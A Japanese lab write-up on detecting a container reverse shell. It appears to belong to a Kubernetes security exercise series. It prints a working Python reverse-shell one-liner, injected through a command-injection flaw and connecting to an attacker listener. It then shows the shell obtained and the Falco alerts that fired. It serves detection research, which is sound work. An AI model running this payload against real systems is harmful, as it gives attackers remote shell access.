## Lab 05: シェル起動・リバースシェル確立

- MITRE ATT&CK for Containers: T1059 (Command and Scripting Interpreter)
- 前提: Lab 1の脆弱性を使い、クラスタ内の攻撃者リスナー（`attacker-listener`, ClusterIP `10.96.66.66:4444`）に対してPythonベースのリバースシェルを確立

### 手順

コマンドインジェクションのペイロードとして、`os.dup2`でstdin/stdout/stderrをソケットに繋ぎ替えるPythonワンライナー（base64エンコードしてクォート崩れを回避）を注入：

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.96.66.66",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

### 結果：リバースシェル確立

攻撃者リスナー側で接続を確認:

```
connect to [::ffff:10.244.1.11]:4444 from ...vulnerable-webapp...:59552
/bin/sh: can't access tty; job control turned off
/ #
```

### Falcoの検知結果（実測）

**本文の想定と異なり、`Reverse Shell Detected`という名前のルールは実在しなかった。** 実際に発火した標準ルールは`Redirect stdout/stdin to network connection`で、これは`dup3`システムコールでstdin/stdout/stderrがネットワークfdに繋ぎ替えられる瞬間を検知するもの。**こちらは`proc.tty`条件を持たず、TTYの有無に関わらず発火する**：

```
11:12:23.028100773: Notice Redirect stdout/stdin to network connection |
  fd.sip=10.96.66.66 connection=10.244.2.3:41008->10.96.66.66:4444
  process=python3 parent=sh command=python3 -c import socket,subprocess,os;...
```

加えて、Lab 1で修正した自前のカスタムルール`Shell Spawned Without TTY`も、シェル生成の時点で重ねて発火した：

```
11:12:22.999536036: Critical Shell spawned without a tty (... parent=sh ...)
```

### 考察（本文修正用）

- Lab 1・Lab 2とは対照的に、**この段階は本文の仮説（「Execution段階はFalcoが強い」）が実機でも裏付けられた**。ただし検知ルール名は`Reverse Shell Detected`ではなく`Redirect stdout/stdin to network connection`に訂正が必要。
- このルールが`proc.tty`条件を持たないのは意図的設計と考えられる——dup2/dup3によるfd置き換えは、TTYの有無に関わらず「リバースシェルの本質的な挙動」そのものだからだと考えられる。Lab 1の`Terminal shell in container`がTTY依存だったのとは対照的に、**検知の確実性は「何を条件にしたルールか」で大きく変わる**という教訓を強める材料になる。
